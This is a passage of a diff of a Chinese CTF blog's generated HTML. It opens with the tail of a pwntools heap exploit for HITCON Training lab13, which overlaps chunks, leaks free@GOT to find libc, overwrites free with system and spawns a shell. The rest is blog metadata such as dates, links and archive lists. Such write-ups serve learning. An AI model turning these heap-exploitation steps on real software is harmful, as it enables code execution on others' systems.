* <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">＃触发堆<span class="number">1</span>的结构到fastbin <span class="number">0x40</span></span><br><span class="line">＃将<span class="number">1</span>的内容堆到fastbin <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">＃新堆<span class="number">1</span>的结构将指向旧堆<span class="number">1</span>的内容，大小为<span class="number">0x20</span></span><br><span class="line">＃新堆<span class="number">1</span>的内容将指向旧堆<span class="number">1</span>的结构，大小为<span class="number">0x30</span></span><br><span class="line">＃也就是说我们可以覆盖新堆<span class="number">1</span>的结构</span><br><span class="line">＃在这里，我们将其堆内容指针覆盖为free @ got</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak freeaddr</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#用系统地址覆盖free @ got</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>最后，记录下一位师傅做到<a href="https://blog.csdn.net/qq_40934487/article/details/91465347" target="_blank" rel="noopener">一道堆题的博客</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/16/HITCON Trainging lab13/" data-id="ck92fhli60000bctywsdefdb7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/04/16/攻防世界-int-overflow/" data-id="ck92g3mr30005bwtybpvlooys" class="article-share-link">Share</a>
       
       
     </footer>
@@ -313,13 +349,23 @@
   
     <article id="post-babyvm" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/16/babyvm/" class="article-date">
-  <time datetime="2020-04-16T06:32:43.772Z" itemprop="datePublished">2020-04-16</time>
+    <a href="/2020/01/16/babyvm/" class="article-date">
+  <time datetime="2020-01-16T07:20:26.000Z" itemprop="datePublished">2020-01-16</time>
 </a>
     
   </div>
   <div class="article-inner">
     
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/16/babyvm/">babyvm</a>
+    </h1>
+  
+
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
@@ -445,7 +491,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/16/babyvm/" data-id="ck92fhlib0002bcty4811sqji" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/01/16/babyvm/" data-id="ck92g3mqz0004bwtyi6wkbmnd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -481,7 +527,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/24/Pwn-learning-process/" data-id="ck92fhli90001bcty0d9vkayq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/24/Pwn-learning-process/" data-id="ck92g3mqv0002bwtyviiay8uq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -922,7 +968,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/23/Freshman-wp/" data-id="ck92fhlic0003bctyc7nwh37t" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/23/Freshman-wp/" data-id="ck92g3mqf0000bwtyafoaw6g2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -967,7 +1013,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/21/hello-world/" data-id="ck92fhlih0005bctyodjal65d" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/21/hello-world/" data-id="ck92g3mqv0003bwtynsy2edxw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -995,7 +1041,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
     </div>
   </div>
 
@@ -1008,23 +1054,23 @@
       <ul>
         
           <li>
-            <a href="/2020/04/16/string/">(no title)</a>
+            <a href="/2020/04/16/HITCON-Trainging-lab13/">HITCON Trainging lab13</a>
           </li>
         
           <li>
-            <a href="/2020/04/16/pwn200/">(no title)</a>
+            <a href="/2020/04/16/攻防世界-string/">攻防世界,string</a>
           </li>
         
           <li>
-            <a href="/2020/04/16/level3/">(no title)</a>
+            <a href="/2020/04/16/攻防世界-pwn200/">攻防世界,pwn200</a>
           </li>
         
           <li>
-            <a href="/2020/04/16/int_overflow/">攻防世界 int_overflow</a>
+            <a href="/2020/04/16/攻防世界-level3/">攻防世界,level3</a>
           </li>
         
           <li>
-            <a href="/2020/04/16/HITCON Trainging lab13/">(no title)</a>
+            <a href="/2020/04/16/攻防世界-int-overflow/">攻防世界,int_overflow</a>
           </li>
         
       </ul>
